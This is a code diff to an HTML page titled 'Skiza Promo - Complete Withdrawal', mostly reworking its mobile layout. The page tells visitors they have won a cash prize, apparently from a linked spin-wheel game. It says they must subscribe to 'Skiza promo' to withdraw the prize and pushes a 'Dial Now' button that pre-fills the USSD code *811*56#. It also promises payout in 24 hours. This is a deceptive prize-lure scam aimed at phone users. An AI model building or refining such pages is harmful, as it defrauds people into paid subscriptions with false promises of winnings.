@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Skiza Promo - Complete Withdrawal</title>
     <style>
         * {
@@ -17,59 +17,59 @@
             min-height: 100vh;
             display: flex;
             justify-content: center;
-            align-items: center;
-            padding: 20px;
+            align-items: flex-start;
+            padding: 10px;
+            overflow-y: auto;
         }
         
         .container {
-            background-color: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            background-color: rgba(255, 255, 255, 0.98);
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
             width: 100%;
-            max-width: 400px;
-            padding: 30px;
+            max-width: 95%;
+            padding: 15px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
+            margin: 10px 0;
         }
         
-        .success-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-            animation: bounce 1s ease-in-out;
+        .trophy {
+            font-size: 36px;
+            margin-bottom: 5px;
         }
         
         h1 {
             color: #1a2a6c;
-            margin-bottom: 15px;
-            font-size: 32px;
+            margin-bottom: 10px;
+            font-size: 22px;
+            line-height: 1.2;
         }
         
         .prize-amount {
-            font-size: 36px;
+            font-size: 24px;
             font-weight: bold;
             color: #b21f1f;
-            margin: 20px 0;
-            padding: 15px;
+            margin: 10px 0;
+            padding: 10px;
             background: linear-gradient(135deg, #fdbb2d, #b21f1f);
-            border-radius: 15px;
+            border-radius: 10px;
             color: white;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-            animation: pulse 2s infinite;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
         }
         
         .withdrawal-info {
             background: #f8f9fa;
-            padding: 20px;
-            border-radius: 12px;
-            margin: 20px 0;
-            border-left: 4px solid #4CAF50;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            border-left: 3px solid #4CAF50;
+            font-size: 13px;
         }
         
         .info-text {
             color: #333;
-            margin-bottom: 10px;
-            line-height: 1.6;
+            margin-bottom: 5px;
+            line-height: 1.4;
         }
         
         .highlight {
@@ -80,72 +80,102 @@
         .subscription-notice {
             background: #fff3cd;
             border: 1px solid #ffeaa7;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 12px 0;
             text-align: left;
+            font-size: 12px;
         }
         
         .notice-title {
             color: #856404;
             font-weight: bold;
-            margin-bottom: 8px;
+            margin-bottom: 5px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 5px;
+            font-size: 13px;
         }
         
         .ussd-section {
-            margin: 25px 0;
+            margin: 15px 0;
         }
         
         .ussd-code-container {
             position: relative;
-            margin: 20px 0;
+            margin: 12px 0;
         }
         
         .ussd-code {
             background: linear-gradient(135deg, #1a2a6c, #b21f1f);
             color: white;
-            padding: 20px;
-            border-radius: 12px;
+            padding: 15px;
+            border-radius: 10px;
             font-family: 'Courier New', monospace;
-            font-size: 24px;
+            font-size: 18px;
             font-weight: bold;
-            letter-spacing: 2px;
-            margin: 15px 0;
-            position: relative;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            letter-spacing: 1px;
+            margin: 10px 0;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+            word-break: break-all;
         }
         
         .copy-btn {
             position: absolute;
             top: 50%;
-            right: 15px;
+            right: 10px;
             transform: translateY(-50%);
             background: rgba(255, 255, 255, 0.2);
             border: none;
             color: white;
-            padding: 8px 12px;
-            border-radius: 6px;
+            padding: 6px 10px;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 12px;
+            font-size: 11px;
             transition: all 0.3s ease;
         }
         
         .copy-btn:hover {
             background: rgba(255, 255, 255, 0.3);
-            transform: translateY(-50%) scale(1.05);
         }
         
         .copy-btn.copied {
             background: #4CAF50;
         }
         
+        .mobile-dial-info {
+            background: #e8f5e9;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #2e7d32;
+            border-left: 3px solid #4CAF50;
+        }
+        
+        .instructions {
+            background: #e8f4fd;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 12px 0;
+            text-align: left;
+            font-size: 12px;
+        }
+        
+        .instructions ol {
+            margin: 8px 0;
+            padding-left: 18px;
+        }
+        
+        .instructions li {
+            margin: 5px 0;
+            color: #333;
+        }
+        
         .action-buttons {
             display: flex;
-            gap: 10px;
-            margin-top: 25px;
+            gap: 8px;
+            margin-top: 15px;
         }
         
         .btn {
@@ -153,25 +183,22 @@
             background: linear-gradient(to right, #1a2a6c, #b21f1f);
             color: white;
             border: none;
-            padding: 16px 20px;
-            border-radius: 10px;
-            font-size: 16px;
+            padding: 12px 10px;
+            border-radius: 8px;
+            font-size: 14px;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 5px;
+            min-height: 44px;
         }
         
         .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        }
-        
-        .btn:active {
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
         
         .btn-dial {
@@ -182,34 +209,9 @@
             background: linear-gradient(to right, #fdbb2d, #b21f1f);
         }
         
-        .instructions {
-            background: #e8f4fd;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            font-size: 14px;
-        }
-        
-        .instructions ol {
-            margin: 10px 0;
-            padding-left: 20px;
-        }
-        
-        .instructions li {
-            margin: 8px 0;
-            color: #333;
-        }
-        
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-10px); }
-            60% { transform: translateY(-5px); }
         }
         
         @keyframes pulse {
@@ -218,59 +220,62 @@
             100% { transform: scale(1); }
         }
         
-        @keyframes confetti {
-            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
-        }
-        
-        .confetti {
-            position: fixed;
-            width: 10px;
-            height: 10px;
-            background: #ff0;
-            opacity: 0;
-            z-index: 1001;
-        }
-        
         .fade-in {
-            animation: fadeIn 0.8s ease-out;
+            animation: fadeIn 0.5s ease-out;
         }
         
-        .trophy {
-            font-size: 48px;
-            margin-bottom: 10px;
-            animation: bounce 2s infinite;
+        /* Compact layout for very small screens */
+        @media (max-width: 320px) {
+            .container {
+                padding: 10px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .prize-amount {
+                font-size: 20px;
+                padding: 8px;
+            }
+            
+            .ussd-code {
+                font-size: 16px;
+                padding: 12px;
+            }
+            
+            .btn {
+                padding: 10px 8px;
+                font-size: 13px;
+            }
         }
         
-        .mobile-dial-info {
-            background: #e8f5e9;
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #2e7d32;
-            border-left: 4px solid #4CAF50;
+        /* Ensure content fits without scrolling */
+        .scrollable-content {
+            max-height: calc(100vh - 40px);
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
     </style>
 </head>
 <body>
-    <div class="container fade-in">
+    <div class="container fade-in scrollable-content">
         <div class="trophy">🏆</div>
         <h1>Congratulations!</h1>
         
         <div class="prize-amount" id="prizeAmount">Kshs 0</div>
         
         <div class="withdrawal-info">
-            <p class="info-text">Your withdrawal request for <span class="highlight" id="withdrawalAmount">Kshs 0</span> has been received.</p>
+            <p class="info-text">Withdrawal request for <span class="highlight" id="withdrawalAmount">Kshs 0</span> received.</p>
         </div>
         
         <div class="subscription-notice">
-            <div class="notice-title">📢 Important Notice</div>
-            <p class="info-text">You must subscribe to Skiza promo to withdraw your prize.</p>
+            <div class="notice-title">📢 Important</div>
+            <p class="info-text">Subscribe to Skiza promo to withdraw your prize.</p>
         </div>
         
         <div class="ussd-section">
-            <p class="info-text">To complete the process, please dial the USSD code below on your phone:</p>
+            <p class="info-text">Dial this USSD code on your phone:</p>
             
             <div class="ussd-code-container">
                 <div class="ussd-code" id="ussdCode">*811*56#</div>
@@ -280,17 +285,17 @@
             </div>
             
             <div class="mobile-dial-info">
-                <p><strong>Note:</strong> The "Dial Now" button will open your phone dialer with the USSD code pre-filled. Just press the call button to proceed.</p>
+                <p><strong>Note:</strong> "Dial Now" will open your phone dialer with USSD code pre-filled.</p>
             </div>
         </div>
         
         <div class="instructions">
-            <p><strong>How to complete your withdrawal:</strong></p>
+            <p><strong>How to complete withdrawal:</strong></p>
             <ol>
-                <li>Dial <strong>*811*56#</strong> on your phone</li>
-                <li>Follow the on-screen instructions to subscribe</li>
-                <li>Your prize will be processed within 24 hours</li>
-                <li>You will receive an SMS confirmation</li>
+                <li>Dial <strong>*811*56#</strong></li>
+                <li>Follow instructions to subscribe</li>
+                <li>Prize processed in 24 hours</li>
+                <li>You'll get SMS confirmation</li>
             </ol>
         </div>
         
@@ -314,26 +319,9 @@
 
         // Get the prize from localStorage
         const currentPrize = localStorage.getItem('currentPrize') || '0';
-        prizeAmount.textContent = `Kshs ${parseInt(currentPrize).toLocaleString()}`;
-        withdrawalAmount.textContent = `Kshs ${parseInt(currentPrize).toLocaleString()}`;
-
-        // Create confetti effect
-        function createConfetti() {
-            const colors = ['#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0', '#9966FF', '#FF9F40', '#4CAF50'];
-            for (let i = 0; i < 50; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.animation = `confetti ${Math.random() * 3 + 2}s linear forwards`;
-                confetti.style.animationDelay = Math.random() * 1 + 's';
-                document.body.appendChild(confetti);
-                
-                setTimeout(() => {
-                    confetti.remove();
-                }, 5000);
-            }
-        }
+        const formattedPrize = parseInt(currentPrize).toLocaleString();
+        prizeAmount.textContent = `Kshs ${formattedPrize}`;
+        withdrawalAmount.textContent = `Kshs ${formattedPrize}`;
 
         // Copy USSD code functionality
         copyBtn.addEventListener('click', async () => {
@@ -365,7 +353,7 @@
             }
         });
 
-        // Dial button functionality - FIXED USSD CODE ISSUE
+        // Dial button functionality
         dialBtn.addEventListener('click', () => {
             // Use the correct tel: format with URL encoding for #
             const ussd = '*811*56%23'; // %23 is the URL-encoded version of #
@@ -375,35 +363,34 @@
                 window.location.href = `tel:${ussd}`;
             } else {
                 // Desktop - show instruction
-                alert(`To complete your withdrawal:\n\n1. Dial *811*56# on your phone\n2. Follow the subscription instructions\n3. Your prize will be processed within 24 hours\n\nThank you for choosing Skiza Promo!`);
+                alert(`To complete your withdrawal:\n\n1. Dial *811*56# on your phone\n2. Follow subscription instructions\n3. Prize processed in 24 hours\n\nThank you!`);
             }
             
-            // Add some visual feedback
+            // Visual feedback
             dialBtn.innerHTML = '📞 Dialing...';
             setTimeout(() => {
                 dialBtn.innerHTML = '📞 Dialed!';
                 setTimeout(() => {
                     dialBtn.innerHTML = '📞 Dial Now';
-                }, 2000);
-            }, 1000);
+                }, 1500);
+            }, 800);
         });
 
         // Close button functionality
         closeBtn.addEventListener('click', () => {
-            // Add some visual feedback before redirecting
-            closeBtn.innerHTML = '🎯 Spinning...';
+            closeBtn.innerHTML = '🎯 Loading...';
             setTimeout(() => {
                 window.location.href = 'wheel.html';
-            }, 800);
+            }, 600);
         });
 
-        // Create confetti on page load
-        window.addEventListener('load', () => {
-            createConfetti();
-        });
+        // Add pulse animation to prize amount
+        setInterval(() => {
+            prizeAmount.style.animation = 'pulse 1.5s ease-in-out';
+            setTimeout(() => {
+                prizeAmount.style.animation = '';
+            }, 1500);
+        }, 5000);
     </script>
 </body>
 </html>
-
-
-
